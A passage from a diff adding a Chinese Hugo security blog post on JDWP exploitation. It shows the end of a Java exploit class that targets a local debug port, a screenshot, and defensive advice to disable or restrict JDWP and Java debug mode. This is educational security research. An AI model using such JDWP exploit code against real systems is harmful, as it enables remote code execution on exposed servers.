+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">life</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">life</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">exploit</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">host</span>, <span style="color:#58a1dd">Integer</span> <span style="color:#58a1dd">port</span>, <span style="color:#58a1dd">Double</span> <span style="color:#58a1dd">life</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">new</span> <span style="color:#58a1dd">App</span>(<span style="color:#58a1dd">host</span>,  <span style="color:#58a1dd">port</span>,  <span style="color:#58a1dd">life</span>).<span style="color:#58a1dd">start</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">exploit</span>(<span style="color:#a6be9d">&#34;127.0.0.1&#34;</span>, <span style="color:#58a1dd">8080</span>, <span style="color:#58a1dd">0</span>.<span style="color:#58a1dd">3</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505212058117.png" alt="image-20250521205840036" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505212058117.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505212058117.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com//img202505212058117.png?size=large 2x" data-title="image-20250521205840036" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="防御方法" class="heading-element"><span>防御方法</span>
+  <a href="#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><ul>
+<li>关闭JDWP服务，或限制JDWP服务不对外开放；</li>
+<li>关闭Java Debug模式；</li>
+</ul></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-21 21:12:01">Updated on 2025-05-21&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jmx%E5%88%9D%E8%AF%86/" class="post-nav-item" rel="prev" title="JMX初识"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>JMX初识</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
